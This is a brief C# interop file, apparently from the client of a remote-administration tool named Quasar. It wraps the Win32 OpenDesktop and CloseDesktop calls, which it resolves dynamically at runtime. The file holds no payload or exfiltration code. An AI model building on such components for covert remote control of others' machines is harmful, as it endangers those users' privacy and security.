using System;
using System.Runtime.InteropServices;

namespace Quasar.Client.Utilities
{
    internal static partial class ClientNatives
    {
        internal delegate IntPtr OpenDesktopFunc(
            [MarshalAs(UnmanagedType.LPWStr)] string hDesktop,
            int flags,
            bool inherit,
            uint desiredAccess);
        internal static IntPtr OpenDesktop(
            [MarshalAs(UnmanagedType.LPWStr)] string hDesktop,
            int flags,
            bool inherit,
            uint desiredAccess) => Lookup<OpenDesktopFunc>("user32.dll", "OpenDesktopW")(hDesktop, flags, inherit, desiredAccess);

        internal delegate bool CloseDesktopFunc(IntPtr hDesktop);
        internal static bool CloseDesktop(IntPtr hDesktop) => Lookup<CloseDesktopFunc>("user32.dll", "CloseDesktop")(hDesktop);
    }
}
